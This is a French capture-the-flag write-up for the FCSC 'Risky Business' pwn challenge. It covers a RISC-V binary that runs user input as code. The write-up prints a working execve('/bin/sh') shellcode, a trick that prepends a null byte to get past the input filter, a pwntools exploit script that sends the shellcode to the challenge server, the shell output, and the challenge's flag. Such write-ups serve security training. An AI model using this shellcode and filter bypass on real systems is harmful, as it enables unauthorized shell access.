# Risky Business - PWN - 200

> L'exercice n'est pas très risqué : retrouver simplement le contenu du fichier flag.

```risky-business: ELF 64-bit LSB shared object, UCB RISC-V, version 1 (SYSV)```

Ok nous avons clairement affaire à du RISC-V, une architecture RISC apparue récemment.

Une grande partie de ce challenge était dans le setup de l'environnement de debug, qui a été simplifié par la mise en ligne du Dockerfile.
On pouvait s'en sortir avec un gdb-multiarch en déboguant en remote, avec le flag -g sur QEMU.

Après un coup de checksec, nous remarquons que la protection NX est désactivée, permettant l'exécution de code sur la pile.

```
    Arch:     em_riscv-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

## Analyse du binaire

Bien que cette architecture soit assez exotique, Ghidra supporte RISC-V !
Plongeons sans plus attendre dans les entrailles du binaire.

Après une rapide analyse du pseudocode généré par Ghidra, on peut voir que le binaire va nous demander d'entrer une chaîne de 67 caractères maximum.

Ensuite, notre chaîne va passer dans un algorithme étrange effectuant des modifications sur celle-ci, puis appeler notre chaîne comme une fonction.

Très bien nous n'avons qu'à lui fournir un shellcode RISC-V pour lancer un shell !

## Exploitation du binaire

N'ayant aucune connaissance en assembleur RISC-V, je m'empresse d'aller voir sur shell-storm s'il n'y en a pas déjà un qui existe ...

Bingo ! [celui-ci](http://shell-storm.org/shellcode/files/shellcode-908.php) devrait faire l'affaire.

Sauf que non ... Le programme crash.
En analysant le contenu de notre chaîne, celle-ci semble corrompue (probablement après être passée dans cet algorithme bizarre).

N'ayant pas la foi de reverse cet algorithme pour trouver les badchars à ne pas adopter dans le shellcode, puis créer ce shellcode sans badchars, on va se pencher sur une autre solution !

On remarque que cet algorithme se base sur la taille de notre chaîne pour faire son travail.
Une chaîne se termine par un octet nul (\x00), et la fonction prenant notre entrée est fgets, s'arrêtant seulement pour les retour à la ligne (\x0a) et le caractère de fin de fichier EOF.

De ce fait, nous ne sommes pas obligé d'avoir du code sans octets nul à l'intérieur, ce qui peut nous faire gagner beaucoup de place.

Si nous mettons un octet nul vers le début de la chaîne, alors seulement les octets non nuls qui sont avant seront filtrés, ce qui laissera le reste intact !

[Cet article](https://thomask.sdf.org/blog/2018/08/25/basic-shellcode-in-riscv-linux.html), nous montre le processus de la réalisation d'un shellcode en RISC-V, il présente au début un code minimal pour faire un appel système execve("/bin/sh", NULL, NULL):

```asm
    .global _start
    .text
_start:
    li s1, 0x68732f2f6e69622f   # Load "/bin//sh" backwards into s1
    sd s1, -16(sp)              # Store dword s1 on the stack
    sd zero, -8(sp)             # Store dword zero after to terminate
    addi a0,sp,-16              # a0 = filename = sp + (-16)
    slt a1,zero,-1              # a1 = argv set to 0
    slt a2,zero,-1              # a2 = envp set to 0
    li a7, 221                  # execve = 221
    ecall                       # Do syscall
```

L'idée serait de placer une instruction qui n'altèrerait pas le fonctionnement de notre shellcode, et contenant un nullbyte.

```lui a5, 0``` est un bon candidat !

Ce qui nous donne: 

```asm
_start:
    lui a5, 0
    li s1, 0x68732f2f6e69622f   # Load "/bin//sh" backwards into s1
    sd s1, -16(sp)              # Store dword s1 on the stack
    sd zero, -8(sp)             # Store dword zero after to terminate
    addi a0,sp,-16              # a0 = filename = sp + (-16)
    slt a1,zero,-1              # a1 = argv set to 0
    slt a2,zero,-1              # a2 = envp set to 0
    li a7, 221                  # execve = 221
    ecall                       # Do syscall
```

Nous n'avons plus qu'à assembler notre code et à l'envoyer au serveur !

Le paquet **binutils-riscv64-linux-gnu** nous permet d'avoir les outils pour faire cela.

```
$ riscv64-linux-gnu-gcc execve.s -c
$ riscv64-linux-gnu-ld execve.o -o execve
$ riscv64-linux-gnu-objcopy -O binary --only-section=.text execve execve.text
$ hexdump -C execve.text 

00000000  b7 07 00 00 b7 a4 43 03  9b 84 94 97 93 94 c4 00  |......C.........|
00000010  93 84 74 7b 93 94 c4 00  93 84 b4 34 93 94 d4 00  |..t{.......4....|
00000020  93 84 f4 22 23 38 91 fe  23 3c 01 fe 13 05 01 ff  |..."#8..#<......|
00000030  93 25 f0 ff 13 26 f0 ff  93 08 d0 0d 73 00 00 00  |.%...&......s...|
00000040
```

Notre shellcode final fait 64 octets, et commence par \xb7\x07 suivi de deux nullbytes, seulement ces deux caractères seront donc affectés.

```py
#!/usr/bin/python

from pwn import *

r = remote('challenges1.france-cybersecurity-challenge.fr', 4004)

shellcode = "\xb7\x07\x00\x00\xb7\xa4\x43\x03\x9b\x84\x94\x97\x93\x94\xc4\x00\x93\x84\x74\x7b\x93\x94\xc4\x00\x93\x84\xb4\x34\x93\x94\xd4\x00\x93\x84\xf4\x22\x23\x38\x91\xfe\x23\x3c\x01\xfe\x13\x05\x01\xff\x93\x25\xf0\xff\x13\x26\xf0\xff\x93\x08\xd0\x0d\x73\x00\x00\x00"

r.sendline(shellcode)
r.sendline()
r.interactive()
```

```
[+] Opening connection to challenges1.france-cybersecurity-challenge.fr on port 4004: Done
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag
FCSC{d79704401bf7c58ca46f3711a9a8c8207d0c4ce7d80fd0dc41df6d5e44b3ddaf}
$  
```

Boom, on a un shell interactif et on peut afficher le flag !

FLAG: FCSC{d79704401bf7c58ca46f3711a9a8c8207d0c4ce7d80fd0dc41df6d5e44b3ddaf}